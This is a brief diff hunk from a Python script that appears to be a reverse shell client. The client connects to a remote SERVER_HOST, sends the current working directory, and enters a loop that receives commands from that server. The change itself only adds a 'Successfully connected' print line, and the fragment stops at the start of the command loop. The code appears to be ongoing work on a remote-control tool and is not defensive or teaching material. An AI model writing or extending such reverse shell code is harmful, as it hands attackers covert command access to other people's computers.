@@ -20,6 +20,7 @@ s = socket.socket()
 s.connect((SERVER_HOST, SERVER_PORT))
 cwd = os.getcwd()
 s.send(cwd.encode())
+print('Successfully connected to server.')
 
 while True:
     command = s.recv(BUFFER_SIZE).decode()
